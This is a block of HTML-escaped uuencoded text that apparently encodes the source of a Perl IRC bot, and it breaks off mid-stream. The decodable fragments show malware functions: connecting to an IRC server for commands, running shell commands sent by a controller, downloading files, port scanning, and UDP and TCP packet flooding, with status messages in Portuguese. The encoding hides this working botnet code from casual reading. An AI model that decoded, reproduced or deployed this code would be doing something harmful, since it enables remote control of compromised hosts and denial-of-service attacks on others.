1N*3L*&quot;B`@)&amp;UA:6XZ.FAT=&#x27;!?9V5T7W)E&lt;W5L=&quot;`](#(P,#L*(&quot;!I9B`H_)&amp;(Q(#U^(&amp;TL7DA45%`O7&amp;0K7&quot;Y&lt;9&quot;M&lt;&lt;RLH7&amp;0K*5M&gt;7#`Q,ETJ7#`Q,BPI(&#x27;L*(&quot;`@(&quot;1M86EN.CIH=&#x27;1P_7V=E=%]R97-U;&#x27;0@/2`D,3L*(&quot;`@(&amp;EF(&quot;@D;6%I;CHZ:&#x27;1T&lt;%]G971?&lt;F5S=6QT(#U^(&quot;]&gt;,S!;,3(S-UTO_(&quot;8F(&quot;1B,2`]?B`O7#`Q,DQO8V%T:6]N.EQS*BA&lt;4RLI+PHI(&#x27;L*(&quot;`@(&quot;`@;7D@)&#x27;5R;&quot;`](&quot;0Q.PH@(&quot;`@_(&quot;!R971U&lt;FX@=6YD968@:68@)&amp;AT=&#x27;!?;&amp;]O&lt;%]C:&amp;5C:WLD=7)L?2LK.PH@(&quot;`@(&quot;!R971U&lt;FX@7V=E=&quot;@D_=7)L*3L*(&quot;`@(&#x27;T*(&quot;`@(&#x27;)E=&#x27;5R;B!U;F1E9B!U;FQE&lt;W,@)&amp;UA:6XZ.FAT=&#x27;!?9V5T7W)E&lt;W5L=&quot;`]?B`O_7C(O.PH@(&#x27;T*&quot;B`@&lt;F5T=7)N(&quot;1B=68[&quot;GT*&quot;@HD&lt;V5L7V-L:65N=&amp;4@/2!)3SHZ4V5L96-T+3YN97&lt;H*3L*_&lt;W5B(&#x27;-E;F1R87&lt;@&gt;PH@(&amp;EF(&quot;@D(U\\@/3T@)S$G*2![&quot;B`@(&quot;!M&gt;2`D&lt;V]C:V5T(#T@)%];,%T[&quot;B`@(&quot;!P_&lt;FEN=&quot;`D&lt;V]C:V5T(&quot;(D7ULQ75QN(CL*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;!P&lt;FEN=&quot;`D25)#7V-U&lt;E]S;V-K970@_(B1?6S!=7&amp;XB.PH@(&#x27;T*?0H*&lt;W5B(&amp;-O;F5C=&amp;%R(&#x27;L*(&quot;`@;7D@)&amp;UE=6YI8VL@/2`D7ULP73L*(&quot;`@;7D@_)&#x27;-E&lt;G9I9&amp;]R7V-O;B`](&quot;1?6S%=.PH@(&quot;!M&gt;2`D&lt;&amp;]R=&amp;%?8V]N(#T@)%];,ET[&quot;@H@(&quot;!M&gt;2`D25)#7W-O_8VME=&quot;`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0&lt;F]T;ST^(G1C&lt;&quot;(L(%!E97)!9&amp;1R/3XB)&#x27;-E&lt;G9I9&amp;]R_7V-O;B(L(%!E97)0;W)T/3XD&lt;&amp;]R=&amp;%?8V]N*2!O&lt;B!R971U&lt;FXH,2D[&quot;B`@(&amp;EF(&quot;AD969I;F5D*&quot;1)4D-?_&lt;V]C:V5T*2D@&gt;PH@(&quot;`@(&quot;1)4D-?8W5R7W-O8VME=&quot;`](&quot;1)4D-?&lt;V]C:V5T.PH*(&quot;`@(&quot;`D25)#7W-O8VME_=&quot;T^875T;V9L=7-H*#$I.PH@(&quot;`@(&quot;1S96Q?8VQI96YT92T^861D*&quot;1)4D-?&lt;V]C:V5T*3L*&quot;B`@(&quot;`@)&amp;ER_8U]S97)V97)S&gt;R1)4D-?8W5R7W-O8VME=&#x27;U[)VAO&lt;W0G?2`](&quot;(D&lt;V5R=FED;W)?8V]N(CL*(&quot;`@(&quot;`D:7)C_7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG&lt;&amp;]R=&amp;$G?2`](&quot;(D&lt;&amp;]R=&amp;%?8V]N(CL*(&quot;`@(&quot;`D:7)C7W-E_&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=](#T@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@)&amp;ER8U]S97)V97)S&gt;R1)_4D-?8W5R7W-O8VME=&#x27;U[)VUE=6EP)WT@/2`D25)#7W-O8VME=&quot;T^&lt;V]C:VAO&lt;W0[&quot;B`@(&quot;`@;FEC:R@B)&amp;UE_=6YI8VLB*3L*(&quot;`@(&quot;!S96YD&lt;F%W*&quot;)54T52(&quot;1I&lt;F-N86UE(&quot;(N)$E20U]S;V-K970M/G-O8VMH;W-T+B(@_)&#x27;-E&lt;G9I9&amp;]R7V-O;B`Z)&#x27;)E86QN86UE(BD[&quot;B`@(&quot;`@&lt;VQE97`@,CL*(&quot;`@?0H*?0IM&gt;2`D;&amp;EN95]T96UP_.PIW:&amp;EL92@@,2`I(&#x27;L*(&quot;`@=VAI;&amp;4@*&quot;$H:V5Y&lt;R@E:7)C7W-E&lt;G9E&lt;G,I*2D@&gt;R!C;VYE8W1A&lt;B@B)&amp;YI_8VLB+&quot;`B)&#x27;-E&lt;G9I9&amp;]R(BP@(B1P;W)T82(I.R!]&quot;B`@(&amp;1E;&amp;5T92@D:7)C7W-E&lt;G9E&lt;G-[)R=]*2!I9B`H_9&amp;5F:6YE9&quot;@D:7)C7W-E&lt;G9E&lt;G-[)R=]*2D[&quot;B`@(&quot;9$0T,Z.F-O;FYE8W1I;VYS.PH@(&quot;!M&gt;2!`&lt;F5A9&#x27;D@_/2`D&lt;V5L7V-L:65N=&amp;4M/F-A;E]R96%D*#`N-BD[&quot;B`@(&amp;YE&gt;&#x27;0@=6YL97-S*$!R96%D&gt;2D[&quot;B`@(&amp;9O&lt;F5A_8V@@)&amp;9H(&quot;A`&lt;F5A9&#x27;DI(&#x27;L*(&quot;`@(&quot;`D25)#7V-U&lt;E]S;V-K970@/2`D9F@[&quot;B`@(&quot;`@)&amp;UE=6YI8VL@/2`D_:7)C7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=].PH@(&quot;`@(&quot;1N&lt;F5A9&quot;`](&#x27;-Y&lt;W)E860H)&amp;9H_+&quot;`D;7-G+&quot;`T,#DV*3L*(&quot;`@(&quot;!I9B`H)&amp;YR96%D(#T](#`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`D&lt;V5L7V-L:65N=&amp;4M/G)E_;6]V92@D9F@I.PH@(&quot;`@(&quot;`@(&quot;1F:&quot;T^8VQO&lt;V4[&quot;B`@(&quot;`@(&quot;`@9&amp;5L971E*&quot;1I&lt;F-?&lt;V5R=F5R&lt;WLD9FA]_*3L*(&quot;`@(&quot;!]&quot;B`@(&quot;`@0&amp;QI;F5S(#T@&lt;W!L:70@*&quot;]&lt;;B\\L(&quot;1M&lt;V&lt;I.PH*(&quot;`@(&quot;!F;W(H;7D@)&amp;,],#L@_)&amp;,\\/2`D(VQI;F5S.R`D8RLK*2![&quot;B`@(&quot;`@(&quot;`D;&amp;EN92`](&quot;1L:6YE&lt;ULD8UT[&quot;B`@(&quot;`@(&quot;`D;&amp;EN93TD_;&amp;EN95]T96UP+B1L:6YE(&amp;EF(&quot;@D;&amp;EN95]T96UP*3L*(&quot;`@(&quot;`@(&quot;1L:6YE7W1E;7`])R&lt;[&quot;B`@(&quot;`@(&quot;`D_;&amp;EN92`]?B!S+UQR)&quot;\\O.PH@(&quot;`@(&quot;`@=6YL97-S(&quot;@D8R`]/2`D(VQI;F5S*2![&quot;B`@(&quot;`@(&quot;`@(&#x27;!A&lt;G-E_*&quot;(D;&amp;EN92(I.PH@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&quot;-L:6YE&lt;R`]/2`P*2![&quot;B`@(&quot;`@_(&quot;`@(&quot;`@(&quot;!P87)S92@B)&amp;QI;F4B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D;&amp;EN97-;)&amp;-=(#U^(&quot;]&lt;&lt;B0O_*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;!A&lt;G-E*&quot;(D;&amp;EN92(I.PH@(&quot;`@(&quot;`@(&quot;`@(&#x27;T@96QS:68@*&quot;1L:6YE(#U^_(&quot;]&gt;*%Q3*RD@3D]424-%($%55$@@.EPJ7&quot;I&lt;*B\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;&amp;%R&lt;V4H(B1L:6YE(BD[_&quot;B`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;QI;F5?=&amp;5M&lt;&quot;`](&quot;1L:6YE.PH@(&quot;`@(&quot;`@_(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;GT*&quot;G-U8B!P87)S92![&quot;B`@(&amp;UY(&quot;1S97)V87)G(#T@&lt;VAI_9G0[&quot;B`@(&amp;EF(&quot;@D&lt;V5R=F%R9R`]?B`O7E!)3D&lt;@7#HH+BHI+RD@&gt;PH@(&quot;`@(&#x27;-E;F1R87&lt;H(E!/3D&lt;@.B0Q_(BD[&quot;B`@(&#x27;T@96QS:68@*&quot;1S97)V87)G(#U^(&quot;]&gt;7#HH+BL_*5PA*&quot;XK/RE&lt;0&quot;@N*S\\I(%!2259-4T&lt;@*&quot;XK_/RD@7#HH+BLI+RD@&gt;PH@(&quot;`@(&quot;`@;7D@)&#x27;!N/20Q.R!M&gt;2`D;VYD92`](&quot;0T.R!M&gt;2`D87)G&lt;R`](&quot;0U.PH@_(&quot;`@(&quot;`@:68@*&quot;1A&lt;F=S(#U^(&quot;]&gt;7#`P,59%4E-)3TY&lt;,#`Q)&quot;\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@;F]T:6-E*&quot;(D&lt;&amp;XB_+&quot;`B7#`P,59%4E-)3TX@;4E20R!V-BXQ-B!%3D4@04Q)3B!&#x27;04)2245,7#`P,2(I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@_(&quot;`@96QS:68@*&quot;1A&lt;F=S(#U^(&quot;]&gt;7#`P,5!)3D=&lt;&lt;RLH7&amp;0K*5PP,#$D+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;!N;W1I8V4H_(B1P;B(L(&quot;)&lt;,#`Q4$].1UPP,#$B*3L*(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;AG&lt;F5P(&#x27;LD7R`]?B`O7EQ1_)&#x27;!N7$4D+VD@?2!`861M&lt;RD@&gt;PH@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;]N9&amp;4@97$@(B1M975N:6-K(BE[&quot;B`@(&quot;`@(&quot;`@_(&quot;`@&lt;VAE;&amp;PH(B1P;B(L(&quot;(D87)G&lt;R(I.PH@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@96QS:68@*&quot;1A&lt;F=S(#U^_(&quot;]&gt;*%Q1)&amp;UE=6YI8VM&lt;17Q&lt;421P&lt;F5F:7AO7$4I7&#x27;,K*&quot;XJ*2\\@*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1N871R_:7@@/2`D,3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;%R9R`](&quot;0R.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;%R9R`]?B`O7EPA_*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I&lt;F-A&lt;V4H(B1P;B(L(B1O;F1E(BPB)#$B*2!U;FQE&lt;W,@*&quot;1N871R_:7@@97$@(B1P&lt;F5F:7AO(B!A;F0@)&amp;%R9R`]?B`O7EPA;FEC:R\\I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D_87)G(#U^(&quot;]&gt;7$`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;]N9&amp;5P(#T@)&amp;]N9&amp;4[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`D;VYD97`@/2`D&lt;&amp;X@:68@)&amp;]N9&amp;4@97$@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!B9G5N8R@B_)&amp;]N9&amp;5P(BPB)#$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-H96QL*&quot;(D;VYD_92(L(&quot;(D87)G(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@?0H@(&quot;!](&amp;5L&lt;VEF(&quot;@D&lt;V5R_=F%R9R`]?B`O7EPZ*&quot;XK/RE&lt;(2@N*S\\I7$`H+BL_*5QS*TY)0TM&lt;&lt;RM&lt;.BA&lt;4RLI+VDI(&#x27;L*(&quot;`@(&quot;`@(&amp;EF_(&quot;AL8R@D,2D@97$@;&amp;,H)&amp;UE=6YI8VLI*2![&quot;B`@(&quot;`@(&quot;`@(&quot;1M975N:6-K/20T.PH@(&quot;`@(&quot;`@(&quot;`D:7)C_7W-E&lt;G9E&lt;G-[)$E20U]C=7)?&lt;V]C:V5T?7LG;FEC:R=](#T@)&amp;UE=6YI8VL[&quot;B`@(&quot;`@(&quot;!]&quot;B`@(&#x27;T@96QS_:68@*&quot;1S97)V87)G(#U^(&amp;TO7EPZ*&quot;XK/RE&lt;&lt;RLT,S,O:2D@&gt;PH@(&quot;`@(&quot;`@)&amp;UE=6YI8VL@/2!G971N:6-K_*&quot;D[&quot;B`@(&quot;`@(&quot;!N:6-K*&quot;(D;65U;FEC:R(I.PH@(&quot;!](&amp;5L&lt;VEF(&quot;@D&lt;V5R=F%R9R`]?B!M+UY&lt;.B@N*S\\I_7&#x27;,K,#`Q7&#x27;,K*%Q3*RE&lt;&lt;R]I*2![&quot;B`@(&quot;`@(&quot;`D;65U;FEC:R`](&quot;0R.PH@(&quot;`@(&quot;`@)&amp;ER8U]S97)V97)S_&gt;R1)4D-?8W5R7W-O8VME=&#x27;U[)VYI8VLG?2`](&quot;1M975N:6-K.PH@(&quot;`@(&quot;`@)&amp;ER8U]S97)V97)S&gt;R1)4D-?_8W5R7W-O8VME=&#x27;U[)VYO;64G?2`](&quot;(D,2([&quot;B`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY(&quot;1C86YA;&quot;`H0&amp;-A;F%I&lt;RD@_&gt;PH@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;)*3TE.(&quot;1C86YA;&quot;(I.PH@(&quot;`@(&quot;`@?0H@(&quot;!]&quot;GT*&quot;G-U8B!B9G5N8R![_&quot;B`@;7D@)&#x27;!R:6YT;&quot;`](&quot;1?6S!=.PH@(&amp;UY(&quot;1F=6YC87)G(#T@)%];,5T[&quot;B`@:68@*&amp;UY(&quot;1P:60@/2!F_;W)K*2![&quot;B`@(&quot;`@=V%I=&#x27;!I9&quot;@D&lt;&amp;ED+&quot;`P*3L*(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;!I9B`H9F]R:RD@&gt;PH@(&quot;`@_(&quot;`@(&quot;!E&gt;&amp;ET.PH@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYP;W)T&lt;V-A_;B`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W1I&lt;#TB)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@0&#x27;!O&lt;G1A_&lt;STH(C(Q(BPB,C(B+&quot;(R,R(L(C(U(BPB-3,B+&quot;(X,&quot;(L(C$Q,&quot;(L(C$T,R(L(C8V-C4B*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;A`86)E&lt;G1A+&quot;`E&lt;&amp;]R=&amp;%?8F%N;F5R*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;9O&lt;F5A8V@@;7D@)&#x27;!O&lt;G1A_(&quot;A`&lt;&amp;]R=&amp;%S*2`@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;-C86YS;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5&quot;T^_;F5W*%!E97)!9&amp;1R(#T^(&quot;1H;W-T:7`L(%!E97)0;W)T(#T^(&quot;1P;W)T82P@4&#x27;)O=&amp;\\@/3X@)W1C&lt;&quot;&lt;L(%1I_;65O=70@/3X@-&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&#x27;-C86YS;V-K*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;!P=7-H(&quot;A`86)E&lt;G1A+&quot;`D&lt;&amp;]R=&amp;$I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;-C86YS;V-K+3YC;&amp;]S93L*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;A`86)E&lt;G1A*2![&quot;B`@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I0;W)T87,@_86)E&lt;G1A&lt;SH@0&amp;%B97)T82(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD_&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;PB4%))5DU31R`D&lt;&#x27;)I;G1L(#I.96YH=6UA(&#x27;!O&lt;G1A(&amp;%B97)T82!F;VD@_96YC;VYT&lt;F%D82XB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D_9G5N8V%R9R`]?B`O7F1O=VYL;V%D7&#x27;,K*&quot;XJ*5QS*R@N*BDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;=E=&#x27;-T;W)E*&quot;(D_,2(L(&quot;(D,B(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT_;&quot;`Z1&amp;]W;FQO860@9&amp;4@)#(@*&quot;0Q*2!#;VYC;&#x27;4N9&amp;\\A(BD@:68@*&quot;1E&lt;W1A=&amp;ES=&amp;EC87,I.PH@(&quot;`@(&quot;`@_(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D9G5N8V%R9R`]?B`O7F9U;&amp;QP;W)T&lt;V-A;EQS*R@N*BE&lt;&lt;RLH_7&amp;0K*5QS*RA&lt;9&quot;LI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W1N86UE/2(D,2([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M_&gt;2`D&lt;&amp;]R=&amp;%I;FEC:6%L(#T@(B0R(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T869I;F%L(#T@(B0S(CL*(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;A`86)E&lt;G1A&lt;RP@)7!O&lt;G1A7V)A;FYE&lt;BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY_(&quot;1P;W)T82`H)&#x27;!O&lt;G1A:6YI8VEA;&quot;XN)&#x27;!O&lt;G1A9FEN86PI&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;1S8V%N&lt;V]C:R`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0965R061D&lt;B`]/B`D:&amp;]S=&amp;YA;64L_(%!E97)0;W)T(#T^(&quot;1P;W)T82P@4&#x27;)O=&amp;\\@/3X@)W1C&lt;&quot;&lt;L(%1I;65O=70@/3X@-&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;EF(&quot;@D&lt;V-A;G-O8VLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!P=7-H(&quot;A`86)E&lt;G1A&lt;RP@)&#x27;!O&lt;G1A*3L*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D&lt;V-A;G-O8VLM/F-L;W-E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;@D97-T871I_&lt;W1I8V%S*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@_)&#x27;!R:6YT;&quot;`Z4&amp;]R=&amp;$@)&#x27;!O&lt;G1A(&amp;%B97)T82!E;2`D:&amp;]S=&amp;YA;64B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]_&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;A`86)E&lt;G1A&lt;RD@&gt;PH@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z4&amp;]R=&amp;%S_(&amp;%B97)T87,Z($!A8F5R=&amp;%S(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!](&amp;5L&lt;V4@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD_&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;PB4%))5DU31R`D&lt;&#x27;)I;G1L(#I.96YH=6UA(&#x27;!O&lt;G1A(&amp;%B97)T82!F;VD@_96YC;VYT&lt;F%D82XB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H*(&quot;`@(&quot;`@(&quot;`@(&quot;`@96QS:68@_*&quot;1F=6YC87)G(#U^(&quot;]&gt;=61P7&#x27;,K*&quot;XJ*5QS*RA&lt;9&quot;LI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;F5T_=7)N(&#x27;5N;&amp;5S&lt;R`D&lt;&amp;%C;W1E&lt;SL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S;V-K970H5&#x27;(P&gt;&quot;P@4$9?24Y%5&quot;P@4T]#2U]$_1U)!32P@,3&lt;I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1A;&#x27;9O/6EN971?871O;B@B)#$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;!M&gt;2`D&lt;&amp;]R=&amp;$@/2`B)#(B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1T96UP;R`](&quot;(D,R([&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@;7D@)&#x27;!A8V]T93L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;&amp;%C;W1E&lt;V4[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;9I_;2`](&#x27;1I;64@*R`D=&amp;5M&lt;&amp;\\[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!A8V]T82`](#$[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_=VAI;&amp;4@*&quot;@D&lt;&amp;%C;W1A(#T](&quot;(Q(BD@)B8@*&quot;1P86-O=&amp;5S(#T](&quot;(Q(BDI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;1P86-O=&amp;$@/2`P(&amp;EF(&quot;@H=&amp;EM92`^/2`D9FEM*2`F)B`H)&#x27;1E;7!O(&quot;$](&quot;(P(BDI.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@)&#x27;!A8V]T93TD&lt;F%N9&quot;!X(&quot;1R86YD(&#x27;@@)&#x27;)A;F0[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D&lt;&amp;]R=&amp;$@/2!I_;G0H&lt;F%N9&quot;`V-3`P,&quot;D@*S$@:68@*&quot;1P;W)T82`]/2`B,&quot;(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&quot;A4&lt;C!X_+&quot;`P+&quot;`D&lt;&amp;%C;W1E+&quot;!S;V-K861D&lt;E]I;B@D&lt;&amp;]R=&amp;$L(&quot;1A;&#x27;9O*2D@86YD(&quot;1P86-O=&amp;5S92LK(&amp;EF(&quot;@D_&lt;&amp;%C;W1E&lt;R`]/2`B,2(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;5S=&amp;%T:7-T:6-A_&lt;RD*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))_5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R5&amp;5M&lt;&amp;\\@9&amp;4@4&amp;%C;W1E&lt;UPP,#(Z(&quot;1T96UP;R(N(G,B*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)4;W1A;&quot;!D92!0_86-O=&amp;5S7#`P,CH@)&#x27;!A8V]T97-E(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T_+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R06QV;R!D;W,@4&amp;%C;W1E&lt;UPP,#(Z(&quot;0Q(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;@H@(&quot;`@(&quot;`@(&quot;`@(&quot;!E;&#x27;-I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYU9&#x27;!F86EX85QS_*R@N*BE&lt;&lt;RLH7&amp;0K*5QS*RA&lt;9&quot;LI+RD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&#x27;!A8V]T97,[_&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V]C:V5T*%1R,&#x27;@L(%!&amp;7TE.150L(%-/0TM?1$=204TL(#$W*3L*(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;!M&gt;2`D9F%I&gt;&amp;%I&lt;#TB)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T82`](&quot;(D,B([&quot;B`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@;7D@)&#x27;1E;7!O(#T@(B0S(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`D&lt;&amp;%C;W1E.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&amp;UY(&quot;1P86-O=&amp;5S.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1F:6T@/2!T:6UE(&quot;L@)&#x27;1E;7!O.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;UY(&quot;1P86-O=&amp;$@/2`Q.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1A;&#x27;9O.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;=H:6QE_(&quot;@D&lt;&amp;%C;W1A(#T](&quot;(Q(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;!A8V]T82`](#`@:68@*&quot;AT:6UE(#X](&quot;1F_:6TI(&quot;8F(&quot;@D=&amp;5M&lt;&amp;\\@(3T@(C`B*2D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W(@*&amp;UY(&quot;1F86EX82`](#$[(&quot;1F_86EX82`\\/2`R-34[(&quot;1F86EX82LK*2![&quot;B`@(&quot;`@(&q